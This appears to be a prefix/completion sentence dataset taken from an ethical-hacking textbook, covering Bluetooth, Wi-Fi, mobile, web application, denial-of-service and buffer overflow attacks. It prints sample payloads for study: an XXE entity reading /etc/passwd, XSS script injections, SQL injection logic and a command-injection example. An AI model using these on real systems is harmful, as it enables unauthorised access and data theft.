this attack uses the object exchange ( obex ) protocol,this attack uses the object exchange ( obex ) protocol to move the message or picture from one device to another
the harm from this sort of attack comes from getting,the harm from this sort of attack comes from getting the device owner to do something you want them to do
bluetooth devices have to be exposed to a certain degree,bluetooth devices have to be exposed to a certain degree to allow other devices to begin a pairing pro - cess
it ’ s been possible to gain access to a,it ’ s been possible to gain access to a device over bluetooth without having gone through the pairing process
if an attacker can gain access to someone ’ s smart - phone or another,"if an attacker can gain access to someone ’ s smart - phone or another bluetooth-enabled device with sensitive data on it , they may be able to extract that data"
"as with other bluetooth attacks , the attacker has to be within","as with other bluetooth attacks , the attacker has to be within close proxim - ity of the device they want to gain access to"
"there is a variation , however , called long distance bluesnarfing ,","there is a variation , however , called long distance bluesnarfing , which can allow the same sort of attack from a greater distance"
"amazon ’ s echo , google ’ s home , and other ,","amazon ’ s echo , google ’ s home , and other , similar devices are generally in a “ listen all the time ” mode"
a bluebugging attack is something similar and was available long before we,a bluebugging attack is something similar and was available long before we started willingly installing these other devices into our living and working spaces
"the initial attack has to be done in close proximity to the target , but the phone call will continue","the initial attack has to be done in close proximity to the target , but the phone call will continue to provide a remote listening point no matter where the victim and attacker are in rela - tionship to one another"
"bluebugging is , perhaps fortunately or unfortunately depending on","bluebugging is , perhaps fortunately or unfortunately depending on which end you are on , easily identified and defeated"
"of course , remediating the vulnerability that gave access","of course , remediating the vulnerability that gave access to the attacker to begin with is a different story"
"this means they are less likely to be successful against modern devices , since vulnerabilities that can","this means they are less likely to be successful against modern devices , since vulnerabilities that can allow attackers easy access have generally been remediated in the intervening years since these attacks were identified"
"given the ubiquitous nature of mobile devices , it would","given the ubiquitous nature of mobile devices , it would make sense that they would be high-value targets for attackers"
while many attacks rely on specific vulnerabilities in applications and operating,"while many attacks rely on specific vulnerabilities in applications and operating systems , there are some attacks that are common across mobile platforms"
"because they work across multiple platforms , they","because they work across multiple platforms , they are more classes of attacks than specific exploits"
"there are currently two predominant platforms for mobile devices ,","there are currently two predominant platforms for mobile devices , though that doesn ’ t mean there are only two platforms"
"android is software developed and managed by google , but","android is software developed and managed by google , but the hardware that runs android is developed by numerous manufacturers"
"google provides the source code for android to vendors , and each vendor may","google provides the source code for android to vendors , and each vendor may implement it in different ways , altering the code and/or adding software and features"
"this means the android platform is splintered and fragmented , not to","this means the android platform is splintered and fragmented , not to mention the large number of android versions that are in the wild"
the advantage to ios from our perspective here is that apple does a lot to drive users,"the advantage to ios from our perspective here is that apple does a lot to drive users to the latest software versions , including making it hard to run newer operating systems on older hardware"
there is a better chance that iphone/ipad os installs are closer to being,"there is a better chance that iphone/ipad os installs are closer to being up to date , with fewer known vulnerabilities than android installations are subject to"
vendors like samsung may also have their own application marketplaces as,vendors like samsung may also have their own application marketplaces as another option for applications to be installed on a mobile device
there is no way to configure additional marketplaces,there is no way to configure additional marketplaces or install applications without breaking the operating system
"this process , commonly called jailbreaking , has become non-trivial as apple ( and google","this process , commonly called jailbreaking , has become non-trivial as apple ( and google and samsung ) have found ways to fix vulnerabilities that allowed for the jailbreaking to happen"
10 apple app store mobile device attacks third-party applications,10 apple app store mobile device attacks third-party applications are the best way to get access to mobile devices
there have been applications that have made it through this vetting,there have been applications that have made it through this vetting pro-cess in both marketplaces that are malicious in one form or another
the problem is even worse with application market- places that don,the problem is even worse with application market- places that don ’ t vet software—meaning running the software through tests and analysis
getting software into a third-party marketplace is a way,getting software into a third-party marketplace is a way to insert spyware and other mal-ware onto mobile devices
these frameworks might commonly be used to send data over an,"these frameworks might commonly be used to send data over an http connection , and they may even force encryption of that connection"
"there is no guarantee of that encryption , though , which means data can be leaked if","there is no guarantee of that encryption , though , which means data can be leaked if the application collects data from the user and then sends that data to a remote storage location"
"this data leakage is potentially a serious problem , and it might also be","this data leakage is potentially a serious problem , and it might also be used by an attacker to gather details that could be used for other attacks"
"this may be especially useful in public places , where people","this may be especially useful in public places , where people are likely to be attached to wireless networks from their mobile devices"
they may also be likely to be doing things like check-ing enterprise email,"they may also be likely to be doing things like check-ing enterprise email or interacting over enterprise communications platforms like microsoft teams , slack , or hipchat"
some other common attacks against mobile devices are the same,some other common attacks against mobile devices are the same as those you would think about for traditional desktop systems
"a mobile device may have a different proces-sor , and the operating systems do provide","a mobile device may have a different proces-sor , and the operating systems do provide some protections for applications so they don ’ t interact with other applications on the device"
"no matter how much testing is performed , between","no matter how much testing is performed , between the software vendor and the platform vendor , bugs happen"
it ’ s commonly felt that openly available encryption is best because it gets to,it ’ s commonly felt that openly available encryption is best because it gets to be analyzed and tested by a lot of people who are the best in their fields
"as more users bring their own devices into the workplace , it can be harder to","as more users bring their own devices into the workplace , it can be harder to protect the enterprise because not every avenue of attack can be closed down on a personal device"
"there may be open authentication , which means anyone","there may be open authentication , which means anyone can join the network without needing to know a password"
modern wireless networks use wpa for encryption and wpa networks use a,modern wireless networks use wpa for encryption and wpa networks use a four-stage handshake to authenticate the station and also derive the encryption key
"unfortunately , the initialization vector , a random value meant to seed the encryption","unfortunately , the initialization vector , a random value meant to seed the encryption , wasn ’ t actually random and could be guessed , leading to key leakage"
"in networks that use wep , the encryption key could","in networks that use wep , the encryption key could be derived if enough frames were collected from the wireless network"
"simultaneously , the attacker may attempt to jam the access point so it","simultaneously , the attacker may attempt to jam the access point so it doesn ’ t get and , more important , respond to the station"
the attacker may continuously send these disassociation messages to force the,the attacker may continuously send these disassociation messages to force the victim station to keep sending messages trying to authenticate against the network
evil twin attacks are where the attacker establishes a network,evil twin attacks are where the attacker establishes a network that appears to be a legitimate network with the same ssid
"the rogue access point could then collect any authentication creden-tials , and once the station had passed those along","the rogue access point could then collect any authentication creden-tials , and once the station had passed those along , the evil twin would allow the connec-tion , gathering traffic from the station once the station was connected"
this is an attack where traffic is reused in order to,this is an attack where traffic is reused in order to force a station to use a key that ’ s already known
"there are several bluetooth attacks , though some of them","there are several bluetooth attacks , though some of them may be outdated and won ’ t work on modern devices"
but there are plenty of legacy devices that,but there are plenty of legacy devices that use older bluetooth implementations where these attacks can work
bluebugging is using bluetooth to connect to a target system and then,bluebugging is using bluetooth to connect to a target system and then initiating a call out from the target system so conversations can be bugged
this may be done using a third-party app store that users,this may be done using a third-party app store that users may be convinced to add as an option to their device
"mobile devices are also vulnerable to the same sorts of attacks as desktops , like","mobile devices are also vulnerable to the same sorts of attacks as desktops , like phishing , malware , and programming errors that can open the door for data leakage"
what mode has to be enabled on a network interface to,what mode has to be enabled on a network interface to allow all headers in wireless traffic to be captured ? a
what wireless attack would you use to take a known piece of,what wireless attack would you use to take a known piece of information in order to be able to decrypt wireless traffic ? a
why is bluesnarfing potentially more dangerous than bluejacking,why is bluesnarfing potentially more dangerous than bluejacking from the standpoint of the victim ? a
once you ’ ve gotten through all of your evalu-ation of the,"once you ’ ve gotten through all of your evalu-ation of the environment , you can move into trying to gain access to it"
it may involve engaging with web applications and,it may involve engaging with web applications and the dif-ferent vulnerabilities that may be exposed there
since the primary objective of ethical hacking is to improve the defensive,"since the primary objective of ethical hacking is to improve the defensive posture of an organization , it ’ s helpful to understand defensive strategies"
when you are providing reme-diations to the organization you are working with,"when you are providing reme-diations to the organization you are working with , you should have a better understanding of what might be done"
attacking a web application successfully may have,"attacking a web application successfully may have multiple potential outcomes , including getting system-level access"
while bandwidth consumption attacks may come to mind when you think of denial of ser,"while bandwidth consumption attacks may come to mind when you think of denial of ser - vice , it ’ s not the only type of denial of service attack"
there are some ways to perform denial of service attacks,there are some ways to perform denial of service attacks that remain effective and have nothing to do with bandwidth consumption
"because of this , and because an easy avenue is often through already","because of this , and because an easy avenue is often through already open holes , it ’ s important to have a good defensive strategy"
while defense in depth and defense in breadth have long been thought to be good approaches to,"while defense in depth and defense in breadth have long been thought to be good approaches to protecting the network , another way to think about the network design is implementing a defensible network architecture"
"pages are presented to the user and there may be links and other content , but there is no","pages are presented to the user and there may be links and other content , but there is no place to enter anything into the page or otherwise send something to the server that may be acted on"
a com- mon way to develop an application is,a com- mon way to develop an application is thought to be through the use of the model/view/controller pattern
1 shows a diagram of how the model/view/controller,1 shows a diagram of how the model/view/controller pattern would be implemented through a web application
"while it is often stored in a database , there is often an","while it is often stored in a database , there is often an application server that manages the model by creating the structure and acting on it"
"the application server uses the database server for persistent storage , but all","the application server uses the database server for persistent storage , but all handling of the data ( the model ) is done in the applica-tion server"
"this means all data manipulation is initiated in the application server ,","this means all data manipulation is initiated in the application server , though execution of the logic may sometimes happen on the database server"
keep in mind that interaction with a database is done,keep in mind that interaction with a database is done through the use of structured query language ( sql )
while the business and application logic happens in the application server,"while the business and application logic happens in the application server , sometimes the manipulation is actually done on the database server"
1 model/view/controller design application server web serverviewmodel databasecontroller the controller is the part of the application that receives requests,"1 model/view/controller design application server web serverviewmodel databasecontroller the controller is the part of the application that receives requests and handles them , vectoring the request to the correct part of the application running in the application server"
there is code in the form of hypertext markup language,there is code in the form of hypertext markup language ( html ) used to describe and render the pages
the application server handles the business logic of the application and may,"the application server handles the business logic of the application and may use differ- ent programming languages , depending on the type of application server"
"on windows , someone maybe using microsoft ’ s internet","on windows , someone maybe using microsoft ’ s internet information server , which would have an appli-cation server supporting"
"tomcat , wildfly ( formerly jboss ) , weblogic","tomcat , wildfly ( formerly jboss ) , weblogic , and many oth-ers are types of java application servers"
the application server itself may introduce differ-ent vulnerabilities and methods of attack,"the application server itself may introduce differ-ent vulnerabilities and methods of attack , but there are also many generic attacks common across web applications"
one important consideration when you are looking at web application,"one important consideration when you are looking at web application attacks , however , is which component is being attacked"
"this means that even if , for example , the client was the target of an","this means that even if , for example , the client was the target of an attack , the client may not be the best place to protect against the attack happening"
xml external entity processing a data model may be a complex set of,xml external entity processing a data model may be a complex set of data where multiple pieces of data are related and need to be organized together
xml allows you to put all related data together into a single,"xml allows you to put all related data together into a single data struc-ture , complete with the organizing information indicating what each piece is"
a common way to pass data back and forth between a client and,a common way to pass data back and forth between a client and a server is to use xml to structure the data and transmit that xml
"as you will see with other web application attack types , an xml entity injection attack comes","as you will see with other web application attack types , an xml entity injection attack comes from code on the web server accepting data that comes from the client without doing any data validation"
"even if it ’ s script code in the page contents that is rendering the data , it ’ s","even if it ’ s script code in the page contents that is rendering the data , it ’ s still possible for a user to tamper with it or even generate a data transmission to send to the server"
"as a general rule , data passed into a function from the outside should not be trusted","as a general rule , data passed into a function from the outside should not be trusted because there is no guarantee the normal control flow of the program hasn ’ t been tampered with"
"when programmers don ’ t do any checking of the data ,","when programmers don ’ t do any checking of the data , bad data can slip into the program and alter the expected behavior"
an example of an xml package that could allow the attacker to,an example of an xml package that could allow the attacker to gain access to system files is shown in the following code listing
0 '' encoding= '' iso-8859-1 '' ? > < ! doctype wubble [ < ! element wubble any > < ! entity xxe system ``,0 '' encoding= '' iso-8859-1 '' ? > < ! doctype wubble [ < ! element wubble any > < ! entity xxe system `` file : ///etc/passwd '' > ] > < wubble > & xxe ; < /wubble > this may not necessarily seem like a big deal
one way of doing this is to have the application server initi,one way of doing this is to have the application server initi - ate a request by passing a url into the system tag
0 '' ? > < ! doctype gvi [ < ! entity xxe system `` url > ] > of course doing this,"0 '' ? > < ! doctype gvi [ < ! entity xxe system `` url > ] > of course doing this sort of resource checking , or port scanning if you will , is not the only thing you can do with this approach"
it ’ s easy enough to use an intercepting proxy or even an in-browser,it ’ s easy enough to use an intercepting proxy or even an in-browser tool to capture requests and modify them before sending them off to the server
any action the application has to perform through the system should,any action the application has to perform through the system should be done directly by the application after it has parsed the data
"going a step further , evalu-ating if there is a","going a step further , evalu-ating if there is a way around the use of any external entity would be useful"
"again , any external need should probably be handled directly","again , any external need should probably be handled directly by the application code after it has prop-erly evaluated any data"
cross-site scripting ( xss ) a cross-site scripting attack is,cross-site scripting ( xss ) a cross-site scripting attack is one that uses the web server to attack the client side
this injects a code fragment from a scripting language into an input fi eld in,this injects a code fragment from a scripting language into an input fi eld in order to have that code executed within the browser of a user visiting a site
"the fi rst type , stored on the server and displayed","the fi rst type , stored on the server and displayed for any user vis-iting a page , is called persistent cross-site scripting"
"you ’ ll note that cross-site scripting is abbreviated xss , where the x is","you ’ ll note that cross-site scripting is abbreviated xss , where the x is a cross , rather than css , where the c is the first letter in cross"
"there is another web technology , cascading style sheets , that is","there is another web technology , cascading style sheets , that is abbreviated css , which could easily become confusing if they were both css"
"for example , the attacker may inject < script > alert (","for example , the attacker may inject < script > alert ( 'wubble ' ) ; < /script > into an input fi eld"
"with persistent cross-site script- ing , this would be a","with persistent cross-site script- ing , this would be a fi eld where the value is stored on the server"
"when someone came back to the forum , the information would be","when someone came back to the forum , the information would be displayed , including the script , which would be run by the browser"
"this sort of url would look like this , and you can see the script passed in as a parameter : url < script >","this sort of url would look like this , and you can see the script passed in as a parameter : url < script > alert ( 5000 ) ; < /script > you would send this url to a victim and do something to get them to click on it"
you can do this in an html email using the following html tag : < a href= '' url < script > alert,"you can do this in an html email using the following html tag : < a href= '' url < script > alert ( 5000 ) ; < /script > '' < /a > the user , getting this email , would only see the clickable link"
"in order to see the url the link goes to , they would have to","in order to see the url the link goes to , they would have to hover their cursor over the link or perhaps look at the source code of the message"
"obviously , a real script would do something more","obviously , a real script would do something more malicious , like stealing session information stored in cookies"
"once the information was stolen , it could be transmitted to an attacker by making","once the information was stolen , it could be transmitted to an attacker by making a request with the stolen informa-tion in it to a server managed by the attacker"
this means you can call methods on the objects—specifically,"this means you can call methods on the objects—specifically , you can get and set parameters for those objects"
sending a url with a value of a script inside the variable will,"sending a url with a value of a script inside the variable will insert the script into the page , meaning the script will get executed"
since scripts can become complex and may use characters that are illegal in a url,"since scripts can become complex and may use characters that are illegal in a url , such as a space or other special characters , the characters need to be encoded"
"in order to url-encode something , you convert the","in order to url-encode something , you convert the ascii characters into a numeric value using the ascii table"
the numeric value is rendered in hexadecimal and that value has a % in front,the numeric value is rendered in hexadecimal and that value has a % in front of it to indicate that the following value is a hexadecimal representation of an ascii character
"back to the space character , the decimal value of","back to the space character , the decimal value of the space character in the ascii character set is 32"
"anytime you see % 20 in a url , you know it ’ s replacing a space character , which wouldn ’ t be handled correctly by a server","anytime you see % 20 in a url , you know it ’ s replacing a space character , which wouldn ’ t be handled correctly by a server since white space is sometimes considered a delimiter , meaning the character before the space would be interpreted as the last character in the url to the web server"
it makes it harder for regular users to know what is being done because,it makes it harder for regular users to know what is being done because they can ’ t easily convert the hexadecimal values back to their ascii equivalents
many of the other attacks can be obscured or made successful through,"many of the other attacks can be obscured or made successful through the use of url encoding , and sql injection is one of them"
"sql is the structured query language , used","sql is the structured query language , used to make programmatic requests of a relational database server"
"the server manages the storage , which will vary from one server type to another , but in order to","the server manages the storage , which will vary from one server type to another , but in order to get to the storage , either by inserting data or retrieving it , you would use the sql programming language"
"an sql attack is an attack against the database server , ultimately","an sql attack is an attack against the database server , ultimately , though it takes advantage of poor programming practices in the application code"
"as an injection attack , it happens when a malicious user","as an injection attack , it happens when a malicious user sends in ( injects ) unexpected data through a web request"
"sometimes , form data is passed directly into an sql","sometimes , form data is passed directly into an sql query from the application server to the database server to execute"
if a fragment of legitimate sql can be sent into a server,"if a fragment of legitimate sql can be sent into a server where it is executed , the database could be altered or damaged"
applications you are trying to attack with sql injection must already have,applications you are trying to attack with sql injection must already have sql in place to run a query necessary for the application to succeed
"for example , perhaps you are browsing an electronic storefront and you are trying to find all doctor","for example , perhaps you are browsing an electronic storefront and you are trying to find all doctor who action figures because you really want one of jodie whittaker , since you have all the others"
"behind the scenes , the application may have an sql statement that reads select * from inventory_table where description == '","behind the scenes , the application may have an sql statement that reads select * from inventory_table where description == ' $ searchstr ' ; what you have submitted ( “ jodie whittaker doll ” ) goes into the variable $ searchstr"
this uses the single quote to close out the existing query string and then,this uses the single quote to close out the existing query string and then introduces the boolean logic term or along with a test that will return a true
"i introduced a single quote to terminate the evaluation in the program , but there is still a single quote hanging out there","i introduced a single quote to terminate the evaluation in the program , but there is still a single quote hanging out there , so if i leave out the single quote , the one in place will replace it , leaving a valid sql statement"
"if the sql server that underpins the application is based on mysql , including both","if the sql server that underpins the application is based on mysql , including both mysql and mariadb , you can use the double dash -- to indicate a comment"
this can allow you to inject your own complete sql,this can allow you to inject your own complete sql statement and then just comment out everything else in the application
since sql doesn ’ t always work the same from one server type to,"since sql doesn ’ t always work the same from one server type to another , the question becomes how you can determine what the underlying database server is"
you may be able to tell based on the results,you may be able to tell based on the results of an application version scan that there is a mysql server
if you are doing against a microsoft iis installation,"if you are doing against a microsoft iis installation , you could guess it may be microsoft sql server"
"if the application is well programmed , you shouldn ’ t get anything","if the application is well programmed , you shouldn ’ t get anything back , but often you will get an error from the database server"
either you will get an error message that includes what the database server is or you will get,either you will get an error message that includes what the database server is or you will get an error message that allows you to determine the server type because of the wording of the error
you need to structure your query so you get either success,you need to structure your query so you get either success or failure that you can see because of how the application works
the purpose of a blind injection is to see,the purpose of a blind injection is to see if the page behaves differently based on the input provided
this may allow you to determine whether a page is vulnerable to sql,this may allow you to determine whether a page is vulnerable to sql injection before you spend a lot of time trying to run these attacks
"instead of a full string , you could do something simple like “","instead of a full string , you could do something simple like “ jodie ” instead of the complete “ jodie whittaker doll ” search used earlier"
if you get a different result from the query 1=1 than you,"if you get a different result from the query 1=1 than you did from 1=2 , the page may be vulnerable to sql injection"
you can make this assumption because the response from,you can make this assumption because the response from the application was different when different sql was submitted
this may include the use of a feature like white listing,"this may include the use of a feature like white listing , which is a list of text that would be allowed"
"additionally , anything that tries to insert sql state-ments by manipulating the quoting won ’ t","additionally , anything that tries to insert sql state-ments by manipulating the quoting won ’ t work because the behavior as a parameter is dif-ferent from just inserting text into a string value"
the application takes a value from the user and,the application takes a value from the user and passes it to a system function or an evaluate function
"this means if there is no input validation , you can pass an operating","this means if there is no input validation , you can pass an operating system command into the input field and that oper-ating system command will be executed"
"if you wanted to condition in the other direction , meaning only run the second command","if you wanted to condition in the other direction , meaning only run the second command if the first one failed , you could use something like dir \windows | echo wubble"
if any-thing doesn ’ t look like you expect it to,"if any-thing doesn ’ t look like you expect it to look , fail the input and demand something cleaner from the user"
you could also structure the application such that no input from the user is ever,"you could also structure the application such that no input from the user is ever directly passed to the system , even if it ’ s part of a command"
if the attacker manages to gain access to the system,"if the attacker manages to gain access to the system through one of the attacks , we start talking about confidentiality"
the purpose of a denial of service is to take an,the purpose of a denial of service is to take an applica-tion out of service so legitimate users can ’ t use it
"as users often interact with businesses through web applications ,","as users often interact with businesses through web applications , they are often the target of denial of service attacks"
this is also because attackers are often outside the,this is also because attackers are often outside the enterprise and web servers are generally exposed to the internet
bandwidth attacks a bandwidth attack is used to generate a lot,bandwidth attacks a bandwidth attack is used to generate a lot of traffic that overwhelms the network connec-tion a service is using
"a problem with bandwidth attacks , especially today , is that your","a problem with bandwidth attacks , especially today , is that your tar-get will likely have a lot more bandwidth capacity than you do"
this may mean you get all of your friends together and,this may mean you get all of your friends together and send as much data to your target as you absolutely can
"another approach that ’ s similar to this but more practical , especially if you don","another approach that ’ s similar to this but more practical , especially if you don ’ t have a lot of friends , is to use a large number of compromised systems"
if you selected a large enough network and made your requests,"if you selected a large enough network and made your requests large enough , you could get a large number of large responses"
"at its peak in the late 1990s and early 2000s , pinging a broadcast address could get tens of thousands","at its peak in the late 1990s and early 2000s , pinging a broadcast address could get tens of thousands of responses , called dupli-cates because after the first response to a request , every successive response is considered a duplicate"
4 shows the largest smurf amplifiers that still existed,4 shows the largest smurf amplifiers that still existed in 2017 before the smurf amplifier registry stopped checking
"4 smurf amplifier registry fortunately , we don ’ t","4 smurf amplifier registry fortunately , we don ’ t have to rely on smurf attacks any longer for amplification attacks"
one attack that was very well known was the attack on brian krebs ’ s website,"one attack that was very well known was the attack on brian krebs ’ s website krebs on security , which provides information security stories written by krebs , an investi-gative journalist"
"a dns request uses udp as the transport protocol , and just as in icmp , there","a dns request uses udp as the transport protocol , and just as in icmp , there is no veri- fication of the source address performed , which makes spoofing the source address trivial"
"a common dns amplification attack has a ratio of 70:1 , meaning","a common dns amplification attack has a ratio of 70:1 , meaning for every byte sent in the request , the response has 70 bytes"
"the attack does require a reflec-tor , meaning a dns server that would perform recursive","the attack does require a reflec-tor , meaning a dns server that would perform recursive queries ( a resolver rather than an authoritative server ) that is open to the internet"
net program that can run on windows systems as,net program that can run on windows systems as well as linux systems that have the mono package installed
"5 low orbit ion cannon a common term for these sorts of attacks is distributed denial of service ,","5 low orbit ion cannon a common term for these sorts of attacks is distributed denial of service , because there are usually multiple systems involved in the attack and they are often scattered all over the internet"
"as noted earlier , as businesses get more bandwidth , it makes it considerably harder for","as noted earlier , as businesses get more bandwidth , it makes it considerably harder for a single system or site to be able to generate enough traffic to take down sites"
"effectively , every modern denial of service attack that","effectively , every modern denial of service attack that is bandwidth oriented is a distributed denial of service attack"
"if you are hosting your own services on your own network and you are the target of a denial of service attack , the best you can do once","if you are hosting your own services on your own network and you are the target of a denial of service attack , the best you can do once you ’ re under attack is contact your internet service provider ( isp ) and hope they will do something to divert the attack before it gets to you"
"since akamai has more than adequate network bandwidth available ,","since akamai has more than adequate network bandwidth available , it can generally withstand the volume of requests that come in"
"of course , any service that is hosted by a cloud provider like amazon web services ,","of course , any service that is hosted by a cloud provider like amazon web services , microsoft ’ s azure , or google ’ s compute can also withstand denial of service attacks"
"when the attack on the website happened , akamai was forced","when the attack on the website happened , akamai was forced to drop the site in order to protect its other customers"
an early denial of service attack was a syn fl ood,an early denial of service attack was a syn fl ood that fi lled up the connection buffers on a web server
"with the slowloris attack ( named after the animal slow loris , a primate found","with the slowloris attack ( named after the animal slow loris , a primate found in southeast asia ) , the objective is to send incomplete requests to a web server"
"in fact , in the following code listing , you can see a","in fact , in the following code listing , you can see a run of the program slowurl which can be used to run the slow-loris attack"
"within 26 seconds , the program had caused a","within 26 seconds , the program had caused a default installation of apache to stop responding to requests"
"this isn ’ t all that impressive , of course , since a default installa-tion of","this isn ’ t all that impressive , of course , since a default installa-tion of apache on a single server isn ’ t confi gured to accept a lot of requests"
the apache killer attack can be run by using slowurl,the apache killer attack can be run by using slowurl the program slowurl sends requests asking for overlapping ranges of bytes
"this is an attack that targets specific versions of apache , whereas the other attacks","this is an attack that targets specific versions of apache , whereas the other attacks are related to the configuration of the server rather than a bug in the soft-ware"
this is where the program makes a request of a large file from the,this is where the program makes a request of a large file from the web server and then reads the file in from the server in small segments
"this keeps the connection open for a long time , holding","this keeps the connection open for a long time , holding up a connection that might otherwise be used by a legitimate user"
legacy there was a time when denial of service attacks came from exploiting weak,"legacy there was a time when denial of service attacks came from exploiting weak implementa-tions of protocols , such as , for example , the syn flood mentioned earlier"
a syn flood is where a large number of syn messages could fill up,a syn flood is where a large number of syn messages could fill up the connection queue on a system so no legitimate connection requests could get in
this was a weak implementation of tcp in an operating system because half-open connections were utilizing system,this was a weak implementation of tcp in an operating system because half-open connections were utilizing system resources for too long before the system gave up on waiting for the rest of the connection
"this sends the segment into a loop in the operating system , as","this sends the segment into a loop in the operating system , as it is processed as an outbound , then an inbound , and so forth"
"udp , like icmp , doesn ’ t validate the source","udp , like icmp , doesn ’ t validate the source address and is connectionless , which means it can be spoofed"
the attacker sends a udp request to the broadcast address,the attacker sends a udp request to the broadcast address of a network with the target address set as the source
a teardrop attack is one in which an attacker sends fragmented,"a teardrop attack is one in which an attacker sends fragmented ip packets to a target , with the fragments set to overlap"
"these attacks , for the most part , don ’ t work any longer because the","these attacks , for the most part , don ’ t work any longer because the implementations of the network stack in most operating systems have been fixed to protect against these anomalies"
network stacks today are far more robust than they,network stacks today are far more robust than they were 20 years ago when these legacy attacks were popular
this is commonly done with invalid input being sent into,this is commonly done with invalid input being sent into the application and the application doesn ’ t validate the input
"these attacks result not only because of poor input validation within the program ,","these attacks result not only because of poor input validation within the program , but also because of how programs are placed in memory by the operating system"
a couple of com-mon ways to change the flow of execution of a program,"a couple of com-mon ways to change the flow of execution of a program , called arbitrary code execution , are through buffer overflows and also heap-based attacks"
"every time a function is called , a new stack frame is created","every time a function is called , a new stack frame is created on the stack containing the contents of variables that are local to the function"
"additionally , and most important for the buffer overflow , the address","additionally , and most important for the buffer overflow , the address to return execution to when the function ends is stored on the stack"
6 stack frame parameters local variables return address,6 stack frame parameters local variables return address a buffer overflow works because of the local variables
"in some cases , data will be copied into the space allocated for it , but if the data being copied into that","in some cases , data will be copied into the space allocated for it , but if the data being copied into that space , called a buffer , is larger than the buffer , the data being copied in will overwrite anything else in the stack"
let ’ s say there is a buffer named strname that has been allocated 10 bytes,let ’ s say there is a buffer named strname that has been allocated 10 bytes ( characters ) but the function is copying 16 bytes ( characters ) into that variable
7 buffer overflow strname ( 10 chars ) aaaaaaaaaa aaaaaareturn,"7 buffer overflow strname ( 10 chars ) aaaaaaaaaa aaaaaareturn address here , the return address is loaded with a s"
an address like this likely falls outside of the address space allocated for the,"an address like this likely falls outside of the address space allocated for the program ’ s execution , which means the program would fail with a segmen-tation fault"
a segmentation fault happens when the program tries to,a segmentation fault happens when the program tries to jump to an address outside of its memory segment
"in the case of a 64-bit system , everything would have to aligned on an 8-byte","in the case of a 64-bit system , everything would have to aligned on an 8-byte boundary , so while there are 10 bytes allocated , it would take up 16 bytes"
the goal of a buffer overfl ow is to inject a section,"the goal of a buffer overfl ow is to inject a section of code , called shellcode , that the attacker wants to be executed"
the place in the stack where the return address is kept needs,the place in the stack where the return address is kept needs to point to the space in memory where the shellcode now resides
"this means whatever code is there , in assembly language because","this means whatever code is there , in assembly language because that ’ s the language the processor understands , will get executed"
"it ’ s called shellcode because when these tiny programs were initially cre- ated ,","it ’ s called shellcode because when these tiny programs were initially cre- ated , it was code used to create a shell to get the attacker access to the system"
"as the program ’ s code lives in a different memory segment ,","as the program ’ s code lives in a different memory segment , there ’ s no reason the stack should contain any code to be executed"
"the standard c library , which contains all the standard func-tions that are included in the c language , is often stored","the standard c library , which contains all the standard func-tions that are included in the c language , is often stored in memory to be shared across all programs that were written in c and have been compiled to use a shared library"
"this library may be stored in a known location in memory , which means the return address can","this library may be stored in a known location in memory , which means the return address can be overwritten with the location of functions from the standard c library that could be used by the attacker"
"even if the location of the library isn ’ t known , it can be determined","even if the location of the library isn ’ t known , it can be determined with some probing , since it ’ s possible to have c functions print out memory locations"
attackers can create exploits because every time a program,"attackers can create exploits because every time a program runs , it appears to get the same memory location"
these addresses are compiled into the program and the operating system allows the program,these addresses are compiled into the program and the operating system allows the program to believe it ’ s in the same place in memory each time it runs
"it gets a different physical address each time , but because of virtual memory , the address a program believes","it gets a different physical address each time , but because of virtual memory , the address a program believes it has can be very different from where it really is because the operating system takes care of the translation"
"an operating system that supports aslr will relocate programs , which","an operating system that supports aslr will relocate programs , which means the pro- gram has to support relative rather than absolute addresses"
"every time the program runs , it gets placed into a different address space","every time the program runs , it gets placed into a different address space , meaning the program is told it ’ s in a different part of memory"
one other way to protect against buffer overfl ows is through,one other way to protect against buffer overfl ows is through the use of a piece of data called the stack canary
as mines have the potential to have deadly gas in them,"as mines have the potential to have deadly gas in them , the canary was used as an early warning for the miners"
"if it has been altered in any way , the assumption is the return address has","if it has been altered in any way , the assumption is the return address has been altered , so it is not used and the program can fail rather than be compromised"
since the stack space in memory is allocated for data the program knows before it,"since the stack space in memory is allocated for data the program knows before it runs , there needs to be memory space for data created and used at runtime"
memory is allocated during program execution off the,memory is allocated during program execution off the heap and data is placed in those memory allocations
"because the memory is allocated during runtime , there is no guarantee what memory will be allocated and when ,","because the memory is allocated during runtime , there is no guarantee what memory will be allocated and when , since data needs may change from one running of the program to another , depending on what the program is doing"
one problem with buffer overflows is how to put shellcode into,one problem with buffer overflows is how to put shellcode into memory and get the return address to point to it reliably
"the heap is generally in a known location in memory , and it may be possible","the heap is generally in a known location in memory , and it may be possible to predict where the shellcode would be placed if it were in allocated space on the heap"
an attacker would store shellcode into the heap in as many places as possible and then,an attacker would store shellcode into the heap in as many places as possible and then make use of a buffer overflow to put the address of the shellcode into the return address
"a common target for these sorts of attacks is browsers , since browsers regularly have to allocate mem-ory dynamically","a common target for these sorts of attacks is browsers , since browsers regularly have to allocate mem-ory dynamically because the resource utilization varies a lot depending on pages that have been requested and what those pages do"
this opens the door to a lot of heap space that can be,this opens the door to a lot of heap space that can be used to store shellcode because of the amount of dynamic memory being allocated
"as more organizations get a handle on the modern attack space , many talk","as more organizations get a handle on the modern attack space , many talk about an attack life cycle that helps to understand what phase an attacker is in"
the attacker is performing recon on the target to determine best methods of,the attacker is performing recon on the target to determine best methods of attack and what may be available at the target worth gaining access to
"the attacker has gained access in the organization ,","the attacker has gained access in the organization , whether through a phishing attack or an application compromise"
this may come from installing a means to get back in,this may come from installing a means to get back in any-time they want without having to rely on the initial compromise vector
the attacker will get the lay of the land internally and,the attacker will get the lay of the land internally and iden- tify other systems that they may be able to compromise
the attacker will compromise other systems in the environment in,"the attacker will compromise other systems in the environment in order to acquire more systems , credentials , and data"
"for every system the attacker compromises , they start the internal","for every system the attacker compromises , they start the internal reconnaissance all over again to identify other systems that could be compromised"
"in the case of a penetration test or ethical hacking engagement , the point of","in the case of a penetration test or ethical hacking engagement , the point of lateral movement is to ensure that the enterprise understands where they may be vulnerable inter-nally"
"shoring up defenses on the outside is insufficient , since you","shoring up defenses on the outside is insufficient , since you may end up with a hard shell but a soft inside"
lateral movement takes the same sorts of strategies used up to this point : more recon- naissance to identify targets,"lateral movement takes the same sorts of strategies used up to this point : more recon- naissance to identify targets of opportunity , gathering credentials , and making use of vari-ous means available to gain remote access to other systems"
moving from linux system to linux system may be as simple as just,moving from linux system to linux system may be as simple as just using secure shell ( ssh ) to gain remote access using harvested credentials
"on the windows side , there are other mechanisms that","on the windows side , there are other mechanisms that could be used to move from one system to another"
